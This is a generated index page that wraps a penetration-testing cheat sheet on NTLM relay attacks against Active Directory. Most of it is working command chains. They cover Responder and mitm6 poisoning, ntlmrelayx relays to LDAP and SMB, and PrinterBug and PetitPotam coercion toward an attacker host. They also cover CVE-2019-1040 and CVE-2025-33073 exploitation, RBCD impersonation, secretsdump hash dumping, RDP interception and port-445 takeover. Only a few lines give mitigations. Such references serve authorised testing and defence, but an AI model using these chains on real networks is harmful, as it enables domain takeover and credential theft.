---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Internal - NTLM Relay

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-internal-relay-ntlm` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/internal-relay-ntlm.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Internal - NTLM Relay](../../topics/active-directory/internal-ntlm-relay.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-internal-relay-ntlm |
| name | Internal - NTLM Relay |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/internal-relay-ntlm.md |

## Preserved Source Material

````yaml
_body: "# Internal - NTLM Relay\n\nNTLMv1 and NTLMv2 can be relayed to connect to another machine.\n\n| Hash             \
  \     | Hashcat | Attack method        |\n|-----------------------|---------|----------------------|\n| LM             \
  \       | `3000`  | crack/pass the hash  |\n| NTLM/NTHash           | `1000`  | crack/pass the hash  |\n| NTLMv1/Net-NTLMv1\
  \     | `5500`  | crack/relay attack   |\n| NTLMv2/Net-NTLMv2     | `5600`  | crack/relay attack   |\n\nCrack the hash with\
  \ `hashcat`.\n\n```powershell\nhashcat -m 5600 -a 0 hash.txt crackstation.txt\n```\n\n## MS08-068 NTLM reflection\n\nNTLM\
  \ reflection vulnerability in the SMB protocolOnly targeting Windows 2000 to Windows Server 2008.\n\n> This vulnerability\
  \ allows an attacker to redirect an incoming SMB connection back to the machine it came from and then access the victim\
  \ machine using the victim’s own credentials.\n\n* <https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS08-068>\n\
  \n```powershell\nmsf > use exploit/windows/smb/smb_relay\nmsf exploit(smb_relay) > show targets\n```\n\n## LDAP signing\
  \ not required and LDAP channel binding disabled\n\nDuring security assessment, sometimes we don't have any account to perform\
  \ the audit. Therefore we can inject ourselves into the Active Directory by performing NTLM relaying attack. For this technique\
  \ three requirements are needed:\n\n* LDAP signing not required (by default set to `Not required`)\n* LDAP channel binding\
  \ is disabled. (by default disabled)\n* `ms-DS-MachineAccountQuota` needs to be at least at 1 for the account relayed (10\
  \ by default)\n\nThen we can use a tool to poison `LLMNR`, `MDNS` and `NETBIOS` requests on the network such as `Responder`\
  \ and use `ntlmrelayx` to add our computer.\n\n```bash\n# On first terminal\nsudo ./Responder.py -I eth0 -wfrd -P -v\n\n\
  # On second terminal\nsudo python ./ntlmrelayx.py -t ldaps://IP_DC --add-computer\n```\n\nIt is required here to relay to\
  \ LDAP over TLS because creating accounts is not allowed over an unencrypted connection.\n\n## SMB Signing Disabled and\
  \ IPv4\n\nIf a machine has `SMB signing`:`disabled`, it is possible to use Responder with Multirelay.py script to perform\
  \ an `NTLMv2 hashes relay` and get a shell access on the machine. Also called **LLMNR/NBNS Poisoning**\n\n1. Open the Responder.conf\
  \ file and set the value of `SMB` and `HTTP` to `Off`.\n\n    ```powershell\n    [Responder Core]\n    ; Servers to start\n\
  \    ...\n    SMB = Off     # Turn this off\n    HTTP = Off    # Turn this off\n    ```\n\n2. Run `python  RunFinger.py\
  \ -i IP_Range` to detect machine with `SMB signing`:`disabled`.\n3. Run `python Responder.py -I <interface_card>`\n4. Use\
  \ a relay tool such as `ntlmrelayx` or `MultiRelay`\n    * `impacket-ntlmrelayx -tf targets.txt` to dump the SAM database\
  \ of the targets in the list.\n    * `python MultiRelay.py -t <target_machine_IP> -u ALL`\n5. ntlmrelayx can also act as\
  \ a SOCK proxy with every compromised sessions.\n\n    ```powershell\n    $ impacket-ntlmrelayx -tf /tmp/targets.txt -socks\
  \ -smb2support\n    [*] Servers started, waiting for connections\n    Type help for list of commands\n    ntlmrelayx> socks\n\
  \    Protocol  Target          Username                  Port\n    --------  --------------  ------------------------  ----\n\
  \    MSSQL     192.168.48.230  VULNERABLE/ADMINISTRATOR  1433\n    SMB       192.168.48.230  CONTOSO/NORMALUSER1       445\n\
  \    MSSQL     192.168.48.230  CONTOSO/NORMALUSER1       1433\n\n    # You might need to select a target with \"-t\"\n \
  \   # smb://, mssql://, http://, https://, imap://, imaps://, ldap://, ldaps:// and smtp://\n    impacket-ntlmrelayx -t\
  \ mssql://10.10.10.10 -socks -smb2support\n    impacket-ntlmrelayx -t smb://10.10.10.10 -socks -smb2support\n\n    # the\
  \ socks proxy can then be used with your Impacket tools or netexec\n    $ proxychains impacket-smbclient //192.168.48.230/Users\
  \ -U contoso/normaluser1\n    $ proxychains impacket-mssqlclient DOMAIN/USER@10.10.10.10 -windows-auth\n    $ proxychains\
  \ netexec mssql 10.10.10.10 -u user -p '' -d DOMAIN -q \"SELECT 1\"   \n    ```\n\n**Mitigations**:\n\n* Disable LLMNR via\
  \ group policy\n\n    ```powershell\n    Open gpedit.msc and navigate to Computer Configuration > Administrative Templates\
  \ > Network > DNS Client > Turn off multicast name resolution and set to Enabled\n    ```\n\n* Disable NBT-NS\n\n    ```powershell\n\
  \    This can be achieved by navigating through the GUI to Network card > Properties > IPv4 > Advanced > WINS and then under\
  \ \"NetBIOS setting\" select Disable NetBIOS over TCP/IP\n    ```\n\n## SMB Signing Disabled and IPv6\n\nSince [MS16-077](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-077)\
  \ the location of the WPAD file is no longer requested via broadcast protocols, but only via DNS.\n\n```powershell\nnetexec\
  \ smb $hosts --gen-relay-list relay.txt\n\n# DNS takeover via IPv6, mitm6 will request an IPv6 address via DHCPv6\n# -d\
  \ is the domain name that we filter our request on - the attacked domain\n# -i is the interface we have mitm6 listen on\
  \ for events\nmitm6 -i eth0 -d $domain\n\n# spoofing WPAD and relaying NTLM credentials\nimpacket-ntlmrelayx -6 -wh $attacker_ip\
  \ -of loot -tf relay.txt\nimpacket-ntlmrelayx -6 -wh $attacker_ip -l /tmp -socks -debug\n\n# -ip is the interface you want\
  \ the relay to run on\n# -wh is for WPAD host, specifying your wpad file to serve\n# -t is the target where you want to\
  \ relay to. \nimpacket-ntlmrelayx -ip 10.10.10.1 -wh $attacker_ip -t ldaps://10.10.10.2\n```\n\n## Drop the MIC - CVE-2019-1040\n\
  \n> The CVE-2019-1040 vulnerability makes it possible to modify the NTLM authentication packets without invalidating the\
  \ authentication, and thus enabling an attacker to remove the flags which would prevent relaying from SMB to LDAP\n\nCheck\
  \ vulnerability with [cve-2019-1040-scanner](https://github.com/fox-it/cve-2019-1040-scanner)\n\n```powershell\npython2\
  \ scanMIC.py 'DOMAIN/USERNAME:PASSWORD@TARGET'\n[*] CVE-2019-1040 scanner by @_dirkjan / Fox-IT - Based on impacket by SecureAuth\n\
  [*] Target TARGET is not vulnerable to CVE-2019-1040 (authentication was rejected)\n```\n\n* Using any AD account, connect\
  \ over SMB to a victim Exchange server, and trigger the SpoolService bug. The attacker server will connect back to you over\
  \ SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant\
  \ DCSync privileges to the attacker account. The attacker account can now use DCSync to dump all password hashes in AD\n\
  \n    ```powershell\n    TERM1> python printerbug.py testsegment.local/username@s2012exc.testsegment.local <attacker ip/hostname>\n\
  \    TERM2> ntlmrelayx.py --remove-mic --escalate-user ntu -t ldap://s2016dc.testsegment.local -smb2support\n    TERM1>\
  \ secretsdump.py testsegment/ntu@s2016dc.testsegment.local -just-dc\n    ```\n\n* Using any AD account, connect over SMB\
  \ to the victim server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can\
  \ be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant Resource Based\
  \ Constrained Delegation privileges for the victim server to a computer account under the control of the attacker. The attacker\
  \ can now authenticate as any user on the victim server.\n\n    ```powershell\n    # create a new machine account\n    TERM1>\
  \ ntlmrelayx.py -t ldaps://rlt-dc.relaytest.local --remove-mic --delegate-access -smb2support \n    TERM2> python printerbug.py\
  \ relaytest.local/username@second-dc-server 10.0.2.6\n    TERM1> getST.py -spn host/second-dc-server.local 'relaytest.local/MACHINE$:PASSWORD'\
  \ -impersonate DOMAIN_ADMIN_USER_NAME\n\n    # connect using the ticket\n    export KRB5CCNAME=DOMAIN_ADMIN_USER_NAME.ccache\n\
  \    secretsdump.py -k -no-pass second-dc-server.local -just-dc\n    ```\n\n## Drop the MIC 2 - CVE-2019-1166\n\n> A tampering\
  \ vulnerability exists in Microsoft Windows when a man-in-the-middle attacker is able to successfully bypass the NTLM MIC\
  \ (Message Integrity Check) protection. An attacker who successfully exploited this vulnerability could gain the ability\
  \ to downgrade NTLM security features. To exploit this vulnerability, the attacker would need to tamper with the NTLM exchange.\
  \ The attacker could then modify flags of the NTLM packet without invalidating the signature.\n\n* Unset the signing flags\
  \ in the `NTLM_NEGOTIATE` message (`NTLMSSP_NEGOTIATE_ALWAYS_SIGN`, `NTLMSSP_NEGOTIATE_SIGN`)\n* Inject a rogue msvAvFlag\
  \ field in the `NTLM_CHALLENGE` message with a value of zeros\n* Remove the MIC from the `NTLM_AUTHENTICATE` message\n*\
  \ Unset the following flags in the `NTLM_AUTHENTICATE` message: `NTLMSSP_NEGOTIATE_ALWAYS_SIGN`, `NTLMSSP_NEGOTIATE_SIGN`,\
  \ `NEGOTIATE_KEY_EXCHANGE`, `NEGOTIATE_VERSION`.\n\n```ps1\nntlmrelayx.py -t ldap://dc.domain.com --escalate-user 'youruser$'\
  \ -smb2support --remove-mic --delegate-access\n```\n\n## Ghost Potato - CVE-2019-1384\n\nRequirements:\n\n* User must be\
  \ a member of the local Administrators group\n* User must be a member of the Backup Operators group\n* Token must be elevated\n\
  \nUsing a modified version of ntlmrelayx : <https://shenaniganslabs.io/files/impacket-ghostpotato.zip>\n\n```powershell\n\
  ntlmrelayx -smb2support --no-smb-server --gpotato-startup rat.exe\n```\n\n## RemotePotato0 DCOM DCE RPC relay\n\n> It abuses\
  \ the DCOM activation service and trigger an NTLM authentication of the user currently logged on in the target machine\n\
  \nRequirements:\n\n* a shell in session 0 (e.g. WinRm shell or SSH shell)\n* a privileged user is logged on in the session\
  \ 1 (e.g. a Domain Admin user)\n\n```powershell\n# https://github.com/antonioCoco/RemotePotato0/\nTerminal> sudo socat TCP-LISTEN:135,fork,reuseaddr\
  \ TCP:192.168.83.131:9998 & # Can be omitted for Windows Server <= 2016\nTerminal> sudo ntlmrelayx.py -t ldap://192.168.83.135\
  \ --no-wcf-server --escalate-user winrm_user_1\nSession0> RemotePotato0.exe -r 192.168.83.130 -p 9998 -s 2\nTerminal> psexec.py\
  \ 'LAB/winrm_user_1:Password123!@192.168.83.135'\n```\n\n## DNS Poisonning - Relay delegation with mitm6\n\nRequirements:\n\
  \n* IPv6 enabled (Windows prefers IPV6 over IPv4)\n* LDAP over TLS (LDAPS)\n\n> ntlmrelayx relays the captured credentials\
  \ to LDAP on the domain controller, uses that to create a new machine account, print the account's name and password and\
  \ modifies the delegation rights of it.\n\n```powershell\ngit clone https://github.com/fox-it/mitm6.git \ncd /opt/tools/mitm6\n\
  pip install .\n\nmitm6 -hw ws02 -d lab.local --ignore-nofqnd\n# -d: the domain name that we filter our request on (the attacked\
  \ domain)\n# -i: the interface we have mitm6 listen on for events\n# -hw: host whitelist\n\nntlmrelayx.py -ip 10.10.10.10\
  \ -t ldaps://dc01.lab.local -wh attacker-wpad\nntlmrelayx.py -ip 10.10.10.10 -t ldaps://dc01.lab.local -wh attacker-wpad\
  \ --add-computer\n# -ip: the interface you want the relay to run on\n# -wh: WPAD host, specifying your wpad file to serve\n\
  # -t: the target where you want to relay to\n\n# now granting delegation rights and then do a RBCD\nntlmrelayx.py -t ldaps://dc01.lab.local\
  \ --delegate-access --no-smb-server -wh attacker-wpad\ngetST.py -spn cifs/target.lab.local lab.local/GENERATED\\$ -impersonate\
  \ Administrator  \nexport KRB5CCNAME=administrator.ccache  \nsecretsdump.py -k -no-pass target.lab.local  \n```\n\n## NTLM\
  \ Reflection - CVE-2025-33073\n\n* Add a DNS record for `[SERVERNAME] + 1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` pointing\
  \ to our IP address. It is also possible to compromise any vulnerable machine by registering `localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA`.\n\
  \n    ```ps1\n    dnstool.py -u 'domain.local\\username' -p 'P@ssw0rd' 10.10.10.10 -a add -r target1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA\
  \ -d 198.51.100.27\n    # OR\n    pretender -i \"vmnet2\" --spoof \"target1UWhR...\" --no-dhcp --no-timestamps\n    ```\n\
  \n* Start the relay to catch the callback from TARGET.\n\n    ```ps1\n    ntlmrelayx.py -t smb://TARGET.domain.local -smb2support\n\
  \    ntlmrelayx.py -t smb://TARGET.domain.local -smb2support -c 'type C:\\Users\\Administrator\\Desktop\\flag.txt'\n   \
  \ ```\n\n* Trigger a callback from the server to `[SERVERNAME] + 1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` using PetitPotam.\n\
  \n    ```ps1\n    nxc smb TARGET.domain.local -u username -p 'P@ssw0rd' -M coerce_plus -o M=Petitpotam LISTENER=target1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA\n\
  \    # OR\n    petitpotam.py -d domain.local -u username -p 'password' \"TARGET1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA\"\
  \ \"TARGET.DOMAIN.LOCAL\"\n    ```\n\n## Relaying with WebDav Trick\n\n> Example of exploitation where you can coerce machine\
  \ accounts to authenticate to a host and combine it with Resource Based Constrained Delegation to gain elevated access.\
  \ It allows attackers to elicit authentications made over HTTP instead of SMB\n\n**Requirement**:\n\n* WebClient service\n\
  \n**Exploitation**:\n\n* Discover machines on the network with enabled WebClient service\n\n    ```ps1\n    webclientservicescanner\
  \ 'domain.local'/'user':'password'@'machine'\n    netexec smb 10.10.10.10 -d 'domain' -u 'user' -p 'password' -M webdav\n\
  \    GetWebDAVStatus.exe 'machine'\n    ```\n\n* Disable HTTP in Responder\n\n    ```ps1\n    sudo vi /usr/share/responder/Responder.conf\n\
  \    ```\n\n* Generate a Windows machine name, e.g: \"WIN-UBNW4FI3AP0\"\n\n    ```ps1\n    sudo responder -I eth0\n    ```\n\
  \n* Prepare for RBCD against the DC\n\n    ```ps1\n    python3 ntlmrelayx.py -t ldaps://dc --delegate-access -smb2support\n\
  \    ```\n\n* Trigger the authentication to relay to our nltmrelayx: `PetitPotam.exe WIN-UBNW4FI3AP0@80/test.txt 10.10.10.10`,\
  \ the listener host must be specified with the FQDN or full netbios name like `logger.domain.local@80/test.txt`. Specifying\
  \ the IP results in anonymous auth instead of System.\n\n  ```ps1\n  # PrinterBug\n  dementor.py -d \"DOMAIN\" -u \"USER\"\
  \ -p \"PASSWORD\" \"ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\" \"TARGET_IP\"\n  SpoolSample.exe \"TARGET_IP\" \"ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\"\
  \n\n  # PetitPotam\n  Petitpotam.py \"ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\" \"TARGET_IP\"\n  Petitpotam.py -d \"DOMAIN\"\
  \ -u \"USER\" -p \"PASSWORD\" \"ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\" \"TARGET_IP\"\n  PetitPotam.exe \"ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\"\
  \ \"TARGET_IP\"\n  ```\n\n* Use the created account to ask for a service ticket:\n\n    ```ps1\n    .\\Rubeus.exe hash /domain:purple.lab\
  \ /user:WVLFLLKZ$ /password:'iUAL)l<i$;UzD7W'\n    .\\Rubeus.exe s4u /user:WVLFLLKZ$ /aes256:E0B3D87B512C218D38FAFDBD8A2EC55C83044FD24B6D740140C329F248992D8F\
  \ /impersonateuser:Administrator /msdsspn:host/pc1.purple.lab /altservice:cifs /nowrap /ptt\n    ls \\\\PC1.purple.lab\\\
  c$\n    # IP of PC1: 10.0.0.4\n    ```\n\nAn alternative for the previous exploitation method is to register a **DNS entry**\
  \ for the attack machine by yourself then trigger the coercion.\n\n```ps1\npython3 /opt/krbrelayx/dnstool.py -u lab.lan\\\
  \\jdoe -p 'P@ssw0rd' -r attacker.lab.lan -a add -d 192.168.1.50 192.168.1.2\npython3 /opt/PetitPotam.py -u jdoe -p 'P@ssw0rd'\
  \ -d lab.lan attacker@80/test 192.168.1.3\n```\n\n## Man-in-the-middle RDP connections with pyrdp-mitm\n\n* [GoSecure/pyrdp](https://github.com/GoSecure/pyrdp)\n\
  * [RDP Man-in-the-Middle – Smile! You’re on Camera](https://www.gosecure.net/blog/2018/12/19/rdp-man-in-the-middle-smile-youre-on-camera)\n\
  \n**Usage**\n\n```sh\npyrdp-mitm.py <IP>\npyrdp-mitp.py <IP>:<PORT> # with custom port\npyrdp-mitm.py <IP> -k private_key.pem\
  \ -c certificate.pem # with custom key and certificate\n```\n\n**Exploitation**\n\n* If Network Level Authentication (NLA)\
  \ is enabled, you will obtain the client's NetNTLMv2 challenge\n* If NLA is disabled, you will obtain the password in plaintext\n\
  * Other features are available such as keystroke recording\n\n**Alternatives**\n\n* [SySS-Research/Seth](https://github.com/SySS-Research/Seth),\
  \ performs ARP spoofing prior to launching the RDP listener\n\n## Relay IIS AppPool to Local Administrator\n\n* HTTP coerce\
  \ from the targeted machine\n\n    ```ps1\n    powershell iwr http://10.10.10.2 -UseDefaultCredentials \n    ```\n\n* Relay\
  \ to LDAP\n\n    ```ps1\n    ntlmrelayx -t ldap://10.10.10.1 -smb2support --interactive\n    ```\n\n* Connect to the interactive\
  \ LDAP shell via TCP\n\n    ```ps1\n    nc 127.0.0.1 <PORT>\n    ```\n\n* Enable TLS and setup RBCD\n\n    ```ps1\n    start_tls\n\
  \    add_computer fakePC P@ssword123\n    set_rbcd TARGET$ fakePC$\n    ```\n\n* Impersonate the administrator\n\n    ```ps1\n\
  \    getST.py -spn 'cifs/target.lab.local' -impersonate Administrator -dc-ip 'dc.lab.local' 'lab.local/fakePC$:P@ssword123'\n\
  \    export KRB5CCNAME=/tmp/Administrator@cifs_target.lab.local@LAB.LOCAL.ccache\n    wmiexec.py -k -no-pass @target.lab.local\n\
  \    ```\n\n## Common Issues Forwarding Port 445\n\nBy default the SMB service is listening on port 445, blocking any relaying\
  \ attempt on this port\n\n**Technique #1**: Forward port 445 on Windows machine using a driver\n\n* [praetorian-inc/PortBender](https://github.com/praetorian-inc/PortBender)\
  \ - TCP Port Redirection Utility\n\n    ```ps1\n    rportfwd 8445 127.0.0.1 445 # Machine 8445 redirected to Teamserver\
  \ 445\n    sudo proxychains python3 examples/ntlmrelayx.py -t smb://10.10.10.10 -smb2support # relay SMB to 10.10.10.10\n\
  \n    upload WinDivert32.sys\n    upload WinDivert64.sys\n\n    PortBender redirect 445 8445 # Redirect port 445 to 8445\
  \ on the machine\n    ```\n\n**Technique #2**: Disable SMB service, to easily portforward port 445\n\n* [zyn3rgy/smbtakeover](https://github.com/zyn3rgy/smbtakeover)\
  \ - BOF and Python3 implementation of technique to unbind 445/tcp on Windows via SCM interactions\n\n    ```ps1\n    python3\
  \ smbtakeover.py atlas.lab/josh:password1@10.0.0.21 check\n    python3 smbtakeover.py atlas.lab/josh:password1@10.0.0.21\
  \ stop\n    python3 smbtakeover.py atlas.lab/josh:password1@10.0.0.21 start\n\n    bof_smbtakeover localhost check\n   \
  \ bof_smbtakeover 10.0.0.21 stop\n    bof_smbtakeover localhost start\n\n    rportfwd_local 445 127.0.0.1 445\n    ```\n\
  \n* [Windows/sc.exe](https://learn.microsoft.com/fr-fr/windows-server/administration/windows-commands/sc-config)\n\n   \
  \ ```ps1\n    sc config LanmanServer start= disabled\n    sc stop LanmanServer\n    sc stop srv2\n    sc stop srvnet\n \
  \   ```\n\n* [XiaoliChan/wmiexec-Pro](https://github.com/XiaoliChan/wmiexec-Pro)\n\n    ```ps1\n    wmiexec-pro.py lab.local/admin@target.lab.local\
  \ service -action disable -service-name \"LanmanServer\"\n    wmiexec-pro.py lab.local/admin@target.lab.local service -action\
  \ stop -service-name \"LanmanServer\"\n    wmiexec-pro.py lab.local/admin@target.lab.local service -action stop -service-name\
  \ \"srv2\"\n    wmiexec-pro.py lab.local/admin@target.lab.local service -action disable -service-name \"srvnet\"\n    wmiexec-pro.py\
  \ lab.local/admin@target.lab.local service -action getinfo -service-name \"srvnet\"\n    ```\n\n## References\n\n* [Abusing\
  \ multicast poisoning for pre-authenticated Kerberos relay over HTTP with Responder and krbrelayx - Quentin Roland - January\
  \ 27, 2025](https://www.synacktiv.com/publications/abusing-multicast-poisoning-for-pre-authenticated-kerberos-relay-over-http-with)\n\
  * [Drop the MIC - CVE-2019-1040 - Marina Simakov - Jun 11, 2019](https://blog.preempt.com/drop-the-mic)\n* [Exploiting CVE-2019-1040\
  \ - Combining relay vulnerabilities for RCE and Domain Admin - Dirk-jan Mollema - June 13, 2019](https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/)\n\
  * [Lateral Movement – WebClient](https://pentestlab.blog/2021/10/20/lateral-movement-webclient/)\n* [NTLM reflection is\
  \ dead, long live NTLM reflection! – An in-depth analysis of CVE-2025-33073 - Wilfried Bécard and Guillaume André - June\
  \ 11, 2025](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)\n\
  * [NTLM Relaying to LDAP - The Hail Mary of Network Compromise - @logangoins - July 23, 2024](https://logan-goins.com/2024-07-23-ldap-relay/)\n\
  * [Playing with Relayed Credentials - June 27, 2018](https://www.secureauth.com/blog/playing-relayed-credentials)\n* [Relay\
  \ Your Heart Away - An OPSEC-Conscious Approach to 445 Takeover - Nick Powers (@zyn3rgy) - Aug 1, 2024](https://posts.specterops.io/relay-your-heart-away-an-opsec-conscious-approach-to-445-takeover-1c9b4666c8ac)\n\
  * [Relay Your Heart Away: An OPSEC-Conscious Approach to 445 Takeover - Nick Powers (@zyn3rgy) - July 27, 2024](https://www.youtube.com/watch?v=iBqOOkQGJEA)\n\
  * [Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition) - Adam Toscher - Mar 9, 2018](https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)"
_relative_path: active-directory/internal-relay-ntlm.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/internal-relay-ntlm.md
````
